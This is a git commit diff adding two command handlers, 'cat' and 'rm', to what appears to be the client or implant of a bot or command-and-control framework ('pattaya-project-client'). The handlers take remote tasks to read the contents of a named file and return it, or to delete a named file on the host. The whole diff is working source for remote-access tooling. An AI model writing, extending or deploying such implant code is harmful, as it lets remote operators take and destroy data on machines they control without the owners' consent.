ce76449982a29a4cf0982f23230b392a41a76754
Anuwat <admin@unknownclub.net>
2023-05-02 23:59:31 +0700

    feat: add rm command

---
+++ pattaya-project-client/Commands/Implements/Cat.cs
@@ -0,0 +1,64 @@
+﻿using pattaya_project_client.Commands.Interfaces;
+using pattaya_project_client.Models;
+using System.IO;
+
+namespace pattaya_project_client.Commands.Implements
+{
+    public class Cat : BotCommand
+    {
+        public override string TaskName => "cat";
+
+        public override BotTaskResult RunTask(BotTask task)
+        {
+            var arguments = task.Arguments.Split(' ');
+
+            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
+            {
+
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = "No file provided"
+                };
+            }
+
+
+            var file = arguments[0];
+
+            string currentDir = Directory.GetCurrentDirectory();
+
+            string fullPath = Path.Combine(currentDir, file);
+
+            if (!File.Exists(fullPath))
+            {
+
+
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = $"{file} not found"
+                };
+            }
+
+            string result;
+
+            try
+            {
+                string content = File.ReadAllText(fullPath); 
+                result = content;
+            }
+            catch (IOException ex)
+            {
+                result = $"Error reading file: {ex.Message}";
+            }
+
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = result,
+            };
+
+
+        }
+    }
+}
---
+++ pattaya-project-client/Commands/Implements/DeleteFile.cs
@@ -0,0 +1,83 @@
+﻿using pattaya_project_client.Commands.Interfaces;
+using pattaya_project_client.Models;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace pattaya_project_client.Commands.Implements
+{
+    public class DeleteFile : BotCommand
+    {
+        public override string TaskName => "rm";
+
+        public override BotTaskResult RunTask(BotTask task)
+        {
+            var arguments = task.Arguments.Split(' ');
+
+            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
+            {
+
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = "No file provided"
+                };
+            }
+
+            var targetFile = arguments[0];
+
+
+            string currentDir = Directory.GetCurrentDirectory();
+
+            // Join paths
+            string fullPath = Path.Combine(currentDir, targetFile);
+
+            if (!File.Exists(fullPath))
+            {
+
+
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = $"{targetFile} already not exist"
+                };
+            }
+
+            try
+            {
+                File.Delete(fullPath); // Delete the file
+            }
+            catch (IOException ex)
+            {
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = $"Error deleting file: {ex.Message}"
+                };
+
+            }
+
+            if (!File.Exists(fullPath))
+            {
+
+
+                return new BotTaskResult
+                {
+                    TaskId = task.TaskId,
+                    Result = $"{fullPath} deleted"
+                };
+            }
+
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = $"Failed to delete {fullPath}"
+            };
+
+
+        }
+    }
+}
